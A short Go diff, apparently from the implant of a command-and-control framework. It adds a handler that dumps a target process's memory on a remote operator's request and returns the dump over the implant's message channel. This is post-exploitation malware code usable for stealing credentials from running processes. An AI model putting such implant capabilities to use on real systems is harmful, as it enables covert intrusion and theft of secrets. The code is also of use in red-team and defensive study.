@@ -10,8 +10,7 @@ import (
 
 	// {{if .Debug}}
 	"log"
-	// {{else}}
-	// {{end}}
+	// {{else}}{{end}}
 
 	"os"
 	"path/filepath"
@@ -322,6 +321,29 @@ func uploadHandler(send chan pb.Envelope, data []byte) {
 	}
 	send <- envelope
 
+}
+
+func dumpHandler(send chan pb.Envelope, data []byte) {
+	procDumpReq := &pb.ProcessDumpReq{}
+	err := proto.Unmarshal(data, procDumpReq)
+	if err != nil {
+		log.Printf("error decoding message: %v", err)
+		return
+	}
+	res, err := DumpProcess(procDumpReq.Pid)
+	dumpResp := &pb.ProcessDump{Data: res.Data()}
+	if err == nil {
+		dumpResp.Err = ""
+	} else {
+		dumpResp.Err = fmt.Sprintf("%v", err)
+	}
+	data, _ = proto.Marshal(dumpResp)
+	envelope := pb.Envelope{
+		Id:   procDumpReq.Id,
+		Type: pb.MsgProcessDump,
+		Data: data,
+	}
+	send <- envelope
 }
 
 // ---------------- Data Encoders ----------------
